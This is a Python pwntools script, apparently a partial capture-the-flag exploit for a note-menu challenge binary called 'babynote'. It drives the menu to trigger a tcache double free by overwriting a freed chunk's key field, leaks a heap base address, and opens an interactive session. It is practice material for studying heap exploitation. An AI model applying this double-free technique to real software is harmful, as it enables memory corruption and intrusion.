#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'debug')

elf  = ELF('./babynote')

# Byte sequence alias
A4 = 4 * b'A'
A8 = 8 * b'A'


class Babynote:
    def __init__(self, proc):
        self.proc = proc

    def create(self, size: int, content: bytes):
        self.proc.sendafter('Choice >', b'1')
        self.proc.sendafter('Note size : ', str(size).encode('utf-8'))
        self.proc.sendafter('Content : ', content)

    def show(self, index: int):
        self.proc.sendafter('Choice >', b'2')
        self.proc.sendafter('Note index : ', str(index).encode('utf-8'))

    def edit(self, index: int, content: bytes):
        self.proc.sendafter('Choice >', b'3')
        self.proc.sendafter('Note index : ', str(index).encode('utf-8'))
        self.proc.sendafter('Content : ', content)

    def delete(self, index: int):
        self.proc.sendafter('Choice >', b'4')
        self.proc.sendafter('Note index : ', str(index).encode('utf-8'))


def main():
    # proc = remote('140.112.31.97', 30203)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    input()

    notes = Babynote(proc)

    notes.create(32, A4)            # tcache: []
    notes.delete(0)                 # tcache: [ chunk0 ]

    notes.create(32, A4)            # tcache: []
    notes.delete(0)                 # tcache: [ chunk0 ]

    notes.edit(1, p64(0) + p64(0))  # modify chunk0's key... prepare for double free
    notes.delete(0)                 # tcache: [ chunk0 -> chunk 0 ]

    notes.show(1)
    heap_base = u64(notes.proc.recv(6).ljust(8, b'\x00')) - (0x55aa77a972a0 - 0x55aa77a97000)
    log.info('heap_base: {}'.format(hex(heap_base)))

    proc.interactive()


if __name__ == '__main__':
    main()
